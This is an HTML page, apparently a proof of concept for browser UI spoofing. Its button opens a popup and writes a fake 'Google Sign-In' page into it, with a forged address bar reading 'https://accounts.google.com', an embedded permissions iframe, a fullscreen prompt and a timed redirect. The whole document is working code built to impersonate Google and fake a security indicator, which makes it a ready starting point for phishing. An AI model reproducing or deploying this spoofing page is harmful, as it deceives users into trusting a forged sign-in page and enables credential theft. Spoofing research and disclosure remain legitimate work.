<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Login</title>
  <style>
    body {
      text-align: center;
      margin-top: 30vh;
      font-family: sans-serif;
    }
    button {
      padding: 14px 28px;
      font-size: 18px;
      background: #007bff;
      color: white;
      border: none;
      border-radius: 8px;
    }
  </style>
</head>
<body>
  <h2>üîê Secure Verification</h2>
  <button id="go">Tap to Continue</button>

  <script>
    document.getElementById("go").onclick = function () {
      const win = window.open("about:blank");

      if (!win) {
        alert("Popup blocked");
        return;
      }

      // Inject fake content synchronously
      win.document.write(`
        <!DOCTYPE html>
        <html>
        <head>
          <title>Google Sign-In</title>
          <style>
            body { margin:0; font-family:sans-serif; background:#fff; }
            .bar {
              background:#f1f3f4;
              padding:10px;
              font-family:monospace;
              font-size:14px;
              color:#202124;
              border-bottom:1px solid #ccc;
            }
            iframe {
              width:100%;
              height:60vh;
              border:none;
            }
            button {
              margin: 20px;
              font-size: 18px;
              padding: 12px 24px;
              background: #34a853;
              color: white;
              border: none;
              border-radius: 6px;
            }
          </style>
        </head>
        <body>
          <div class="bar">üîí https://accounts.google.com</div>
          <h2 style="padding: 10px;">Enable Full Access</h2>
          <iframe src="https://permission.site"></iframe>
          <button onclick="document.documentElement.requestFullscreen()">Enter Fullscreen</button>
          <script>
            setTimeout(() => location.href = 'https://google.com:8000', 10000);
          </script>
        </body>
        </html>
      `);
      win.document.close();
    };
  </script>
</body>
</html>
